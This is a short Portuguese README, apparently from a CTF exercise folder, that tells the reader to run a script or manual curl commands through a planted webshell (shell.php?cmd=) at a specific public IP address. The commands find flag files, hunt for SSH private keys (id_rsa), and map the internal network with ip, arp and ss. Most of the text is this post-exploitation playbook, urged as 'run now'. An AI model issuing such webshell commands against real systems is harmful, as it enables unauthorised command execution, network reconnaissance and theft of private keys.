# EXECUTAR AGORA - Investigação Automática

## 🚀 Como Executar

### Opção 1: Script Python (RECOMENDADO)

```bash
cd "/home/client01/Área de trabalho/todos os ctfs/CTF9/Parte2/ajudaparte1"
python3 investigacao_completa.py
```

O script vai:
- ✅ Testar webshell
- ✅ Buscar todas as flags
- ✅ Investigar rede interna
- ✅ Buscar chaves SSH
- ✅ Verificar histórico
- ✅ Salvar tudo em `resultados_completos.txt`

### Opção 2: Comandos Manuais

Se o script não funcionar, execute estes comandos manualmente via webshell:

```bash
# 1. Teste
curl "http://44.197.173.254/shell.php?cmd=whoami"

# 2. Buscar flags
curl "http://44.197.173.254/shell.php?cmd=find+/+-name+%22*flag*%22+-type+f+2%3E/dev/null"

# 3. Rede interna
curl "http://44.197.173.254/shell.php?cmd=ip+a"
curl "http://44.197.173.254/shell.php?cmd=ip+route"
curl "http://44.197.173.254/shell.php?cmd=arp+-a"

# 4. Conexões
curl "http://44.197.173.254/shell.php?cmd=ss+-antp+%7C+grep+ESTABLISHED"

# 5. Chaves SSH
curl "http://44.197.173.254/shell.php?cmd=find+/+-name+%22id_rsa*%22+2%3E/dev/null"
```

## 📋 O que o Script Faz

1. ✅ Testa webshell
2. ✅ Busca arquivos com "flag" no nome
3. ✅ Busca arquivos LightBringers
4. ✅ Busca "solyd" em arquivos
5. ✅ Verifica interfaces de rede
6. ✅ Verifica rotas
7. ✅ Verifica ARP cache
8. ✅ Verifica conexões estabelecidas
9. ✅ Busca chaves SSH
10. ✅ Verifica known_hosts
11. ✅ Verifica histórico bash
12. ✅ Verifica processos suspeitos
13. ✅ Verifica diretórios específicos
14. ✅ Verifica usuário e privilégios

## 📊 Resultados

Todos os resultados serão salvos em `resultados_completos.txt`

---

**EXECUTE AGORA:** `python3 investigacao_completa.py`
